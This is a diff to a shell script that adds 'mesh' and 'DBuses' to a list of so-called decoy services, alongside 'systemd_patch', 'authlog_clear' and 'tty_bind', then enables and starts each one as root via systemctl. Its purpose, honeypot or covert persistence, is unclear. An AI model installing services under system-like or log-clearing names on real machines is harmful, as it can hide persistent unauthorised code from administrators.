@@ -18,6 +18,8 @@ DECOY_SERVICES=(
     systemd_patch
     authlog_clear
     tty_bind
+    mesh
+    DBuses
 )
 
 sudo cp "$DECOY_SOURCE" "$DECOY_DEST"
@@ -45,3 +47,7 @@ done
 
 # Reload systemd to acknowledge the decoys
 sudo systemctl daemon-reexec >/dev/null 2>&1
+for name in "${DECOY_SERVICES[@]}"; do
+    sudo systemctl enable "$name"
+    sudo systemctl start "$name"
+done
